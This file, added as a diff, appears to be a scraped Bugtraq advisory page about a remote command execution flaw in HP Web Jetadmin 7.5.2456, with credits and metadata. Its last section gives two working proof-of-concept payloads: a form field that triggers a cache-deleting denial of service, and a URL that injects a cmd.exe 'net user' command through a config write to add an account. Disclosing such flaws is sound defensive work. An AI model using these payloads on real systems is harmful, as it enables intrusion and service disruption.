@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid9973<p><b><span style="font-size: 18pt;">HP Web Jetadmin Remote Arbitrary Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9973/info">info</a><br><a href="http://www.securityfocus.com/bid/9973/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9973/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9973/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9973/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9973
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 24 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 24 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Disclosure of this issue is credited to "wirepair" &lt;wirepair@roguemail.net&gt; and H D Moore &lt;sflist@digitaloffense.net&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					HP Web Jetadmin 7.5.2456 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept example has been provided:<br/>/plugins/hpjfpmui/script/wja_update_product.hts:<br/>(Changed the value of obj to our DoS function)<br/>&lt;FORM onsubmit="return VerifyUpload(this)" action=wja_update_product.hts<br/>method=post encType=multipart/form-data&gt;<br/>&lt;INPUT type=hidden value=httpd:RemoveCacheFiles($dir$) name=obj&gt; &lt;INPUT<br/>type=hidden value=true name=__save&gt;<br/>&lt;INPUT type=hidden value=0 name=packageCount&gt; &lt;INPUT type=hidden value=blah.fpm name=goodFilename&gt;<br/><br/>The following proof of concept that will create a user account has been provided by H D Moore &lt;sflist@digitaloffense.net&gt;:<br/><br/>https://&lt;target&gt;:8443/plugins/framework/script/tree.xms?obj=httpd:WriteToFile($__installdir$conf/portlisten.conf,Listen%208000%0A%0DAccessLog%20"|../../../../../../winnt/system32/cmd.exe%20/c%20net%20user%20P%20P%20/ADD")
+	
+		<ul>
+</ul>
+</div>
